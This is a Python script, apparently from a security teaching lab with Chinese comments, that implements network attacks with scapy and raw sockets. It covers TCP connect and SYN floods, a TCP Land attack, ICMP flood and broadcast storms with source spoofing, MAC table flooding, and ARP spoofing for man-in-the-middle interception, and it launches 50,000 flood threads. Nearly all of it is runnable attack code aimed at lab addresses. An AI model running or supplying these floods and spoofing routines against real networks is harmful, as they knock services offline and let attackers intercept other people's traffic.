# 模拟各类泛洪攻击
import socket, random, time, os, threading
from scapy.arch import get_if_hwaddr
from scapy.layers.inet import IP, TCP, ICMP
from scapy.layers.l2 import Ether, getmacbyip, ARP
from scapy.sendrecv import send, sendp
from scapy.volatile import RandMAC, RandIP

# TCP三次握手泛洪
def socket_flood():
    while True:
        s = socket.socket()
        s.connect(('192.168.19.132', 3306))

# scapy半连接
def scapy_flood():
    while True:
        sport = random.randint(10000, 30000)
        pkg = IP(dst='192.168.19.132')/TCP(sport=sport, dport=3306, flags='S')
        send(pkg, verbose=False)

# TCP Land     源地址和目的地址都是相同IP
def tcp_land():
    while True:
        sport = random.randint(10000, 30000)
        pkg = IP(src='192.168.19.132', dst='192.168.19.132')/TCP(sport=sport, dport=3306, flags='S')
        send(pkg, verbose=False)

# ICMP泛洪    构造一个ICMP报文
def icmp_flood():
    while True:
        # ip_list = ['192.168.19.188','192.168.19.189','192.168.19.187','192.168.19.186']
        # ip = random.choice(ip_list)
        payload = 'HelloWoniu'*100
        pkg = IP(src='192.168.19.128', dst='192.168.19.132')/ICMP()/payload*200  # 一次性发200个数据包
        # 设置源IP为第三方IP，实现反射攻击
        send(pkg, verbose=False)

# ICMP广播风暴
# 发送ICMP给广播地址，这样该网段内所有用户都会受到该流量包
def icmp_broadcast():
    while True:
        payload = 'HelloWoniu'*100
        pkg = IP(dst='192.168.19.132')/ICMP()/payload*200  # 一次性发200个数据包
        send(pkg, verbose=False)
'''
    也可以使用ping命令进行泛洪
    1.ping -i 0.001 -s 2000 192.168.19.132
    2.ping -f 192.168.19.132
'''

# MAC地址泛洪
# 不停发送随机生成的mac地址数据包，都会流向交换机，填满路由表，
# 随后进行广播，同网段便都可以收到数据包，或者交换机崩了
def mac_flood():
    while True:
        #随机MAC
        randmac=RandMAC("*:*:*:*:*:*")
        print(randmac)
        #随机IP
        srandip=f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
        drandip=f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
        print(srandip)
        #构造数据包
        packet=Ether(src=randmac,dst=randmac)/IP(src=srandip,dst=drandip)
        sendp(packet,iface='VMware Virtual Ethernet Adapter for VMnet8',loop=0)
        # sendp(packet,iface='Realtek PCIe GbE Family Controller',loop=0)


# 攻击主机告诉被攻击主机，我是网关，告诉网关，我是被攻击主机。
# Linux查看网关ip地址：route       Linux查看网关mac地址：arp -a
# 攻击机要开启ip转发       cat /proc/sys/net/ipv4/ip_forward
#                       echo 1 >> /proc/sys/net/ipv4/ip_forward
def arp_spoof():
    iface = "VMware Virtual Ethernet Adapter for VMnet8"
    # 被攻击主机的MAC和IP， Windows10
    target_ip = '192.168.19.128'
    target_mac = '00:0c:29:9a:03:9b'

    # 攻击主机的MAC和IP， Kali
    spoof_ip = '192.168.19.129'
    spoof_mac = '00:0c:29:f7:e7:28'

    # 真实网关的MAC和IP
    gateway_ip = '192.168.19.2'
    geteway_mac = getmacbyip(gateway_ip)

    # 构造两个数据包，实现对被攻击主机和网关的欺骗
    while True:
        # 欺骗被攻击主机：op=1: ARP请求， op=2：ARP响应
        packet = Ether(src=spoof_mac, dst=target_mac)/ARP(hwsrc=spoof_mac, psrc=gateway_ip, hwdst=target_mac, pdst=target_ip, op=2)
        sendp(packet, iface=iface)

        # 欺骗网关
        packet = Ether(src=spoof_mac, dst=geteway_mac)/ARP(hwsrc=spoof_mac, psrc=target_ip, hwdst=geteway_mac, pdst=gateway_ip, op=2)
        sendp(packet, iface=iface)

        time.sleep(1)


if __name__ == '__main__':
    for i in range(50000):
        # threading.Thread(target=socket_flood).start()
        threading.Thread(target=scapy_flood).start()
        # threading.Thread(target=tcp_land).start()
        # threading.Thread(target=icmp_flood).start()
        # threading.Thread(target=icmp_broadcast).start()
        # threading.Thread(target=mac_flood).start()

    # arp_spoof()